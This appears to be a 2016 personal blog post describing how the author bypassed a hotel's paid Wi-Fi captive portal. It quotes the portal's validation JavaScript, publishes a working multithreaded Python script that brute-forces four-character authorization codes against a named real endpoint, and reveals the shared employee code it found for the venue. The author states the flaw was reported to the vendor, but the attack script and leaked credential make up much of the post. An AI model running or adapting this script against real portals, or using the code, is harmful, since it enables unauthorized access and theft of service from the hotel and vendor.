---
layout: post
title: "How I Got Free Wi-Fi at a Hotel"
date: 2016-09-11T00:05:43-04:00
---
*Full Disclosure: I still paid for internet and contacted Intello about the vulnerability.*

Recently I visited Blue Mountain, and I wanted to see if I could avoid paying $15 per day per device for internet access. Once you connect to their network, they present 3 options to purchase internet access:

  1. Enter your credit card information and get billed directly.
  2. Enter your room number and name and have the charge applied to your room.
  3. Enter an authorization code.

I pursued option 3, and decided to crack an authorization code through brute-force. I looked through the html/javascript and found that it wasn't minified, so it was easy to see the logic. The submit button triggers a javascript function that uses JQuery to get the value of the auth code field, and it makes an HTTP GET request where the auth code is a query parameter. The result is a JSON object, and if the property "status" is 2, then it is a valid auth code. This endpoint was very fast, and didn't have any special encoding or security measurements in place. On the website it said that authorization codes are case insensitive, and I made the assumption that they were alphanumeric. 

{% highlight javascript %}
$.ajax({
    url: "http://portal.ihotel.ca/GuestsAPI?function=ValidateAuthCode&iHotelAuthCode=" + $('#iHotel_Authcode').val() + "&iHotelLocation=" + iHotel_location_id,
    cache: false,
    success: function(data) {
        switch (data.status) {
            case 0:
                iHotelBlockUI("error-text", "We are sorry, but the code you have entered is not registered. If you have misspelled the authorization code, please try again, otherwise please contact the hotel front desk to receive a new authorization code. <p><small>The authorization code is not case sensitive.</small></p>[IHCC005]", "error-lightbox");
                break;
            case 1:
                iHotelBlockUI("error-text", "Maximum number of devices reached for this transaction. Please contact the front desk to obtain an authorization code.(IHCC032)", "error-lightbox");
                break;
            case 2:
                //Code is valid, let's try to authorize it
                //alert("Will use: "+data.location_id);
                if (data.location_id) {
                    $("#iHotel_Authcode_location_id").val(data.location_id);
                }
                LoadingShow();
                $('#iHotel_AuthCode_Form').submit();
                break;
            case 3:
                //Code is valid, in an allowed roaming location, let's use it.
                $("#iHotel_Authcode_location_id").val(data.location_id);
                $("#iHotel_AuthCode_Form").submit();
                break;
            default:
                iHotelBlockUI("error-text", "An error occured, please contact the front desk to obtain an authorization code.(IHCC031)", "error-lightbox");
        }
    },
    error: function(data) {
        iHotelBlockUI("error-text", "An error occured, please contact the front desk to obtain an authorization code.(IHCC031)", "error-lightbox");
    }
});
{% endhighlight %}

I wrote a python script to try all alphanumeric auth codes of length 4 and let it run for about 30 minutes. This was a multithreaded script using 200 threads, making a total of 1.7 million requests. The script stumbled upon `ends`, which turned out to be an authorization code that employees of Blue Mountain share to get internet access. I entered this code into the landing page and it worked. Free internet access after a half-hour of password cracking.

{% highlight python %}
from urlparse import urlparse
from threading import Thread
import httplib, sys, urllib2, urllib
from Queue import Queue
numThreads = 200
url1 = "http://portal.ihotel.ca/GuestsAPI?function=ValidateAuthCode&iHotelAuthCode="
url2 = "&iHotelLocation=BlueMountainGuests"
letters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

def doWork():
  while True:
    code = q.get()
    status, url = getStatus(code)
    doSomethingWithResult(status, url)
    q.task_done()

def getStatus(code):
  try:
    conn = httplib.HTTPConnection("portal.ihotel.ca")
    params = {"function": "ValidateAuthCode", "iHotelAuthCode": code, "iHotelLocation": "BlueMountainGuests"}
    conn.request("GET", "/GuestsAPI?function=ValidateAuthCode&iHotelAuthCode=" + code + "&iHotelLocation=BlueMountainGuests")
    res = conn.getresponse()
    val = res.read()
    conn.close()
    return val, code
  except:
    return "error", code

def doSomethingWithResult(result, code):
  print code 
  if "Invalid" not in result:
    print result, code
    sys.exit(1)

q = Queue(numThreads * 2)
for i in range(numThreads):
  t = Thread(target=doWork)
  t.daemon = True
  t.start()
try:
  for n in range(36**4):
    n = n + 36**4
    code = ""
    while n > 0:
      code = letters[n%36] + code
      n = int(n / 36)
    code = code[1:]
    q.put(code)
  q.join()
except KeyboardInterrupt:
  sys.exit(1)
{% endhighlight %}

{% include disqus.html %}

